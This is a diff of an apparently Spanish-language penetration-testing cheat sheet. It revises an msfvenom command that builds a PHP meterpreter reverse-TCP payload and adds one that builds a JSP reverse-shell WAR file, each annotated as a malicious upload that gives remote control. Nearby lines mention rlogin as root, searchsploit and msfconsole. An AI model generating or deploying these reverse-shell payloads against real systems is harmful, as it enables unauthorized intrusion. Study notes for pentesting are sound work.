@@ -169,7 +169,9 @@ rlogin -l root (ip) [intenta iniciar una sesión remota en otro sistema utilizan
 
 searchsploit (nombre del exploit) [busca posibles exploits]
 
-sudo msfvenom -p php/meterpreter_reverse_tcp LHOST=(ip) LPORT=(puerto) -f raw > archivo [este comando crea un archivo PHP malicioso que al abrirse se conecta a tu IP y puerto para darte control remoto del sistema]
+msfvenom -p php/meterpreter_reverse_tcp LHOST=(ip) LPORT=(puerto) -f raw > archivo.php [crea un archivo PHP malicioso que al subirlo se conecta a tu IP y puerto para darte control remoto del sistema]
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=(ip) LPORT=(puerto) -f war > archivo.war [cre un archivo WAR malicioso que al subirlo se conecta a tu IP y puerto para conseguir control remoto del sistema]
 
 msfconsole [inicia metasploit y su consola para pruebas de penetración que permite identificar, explotar y validar vulnerabilidades]
 
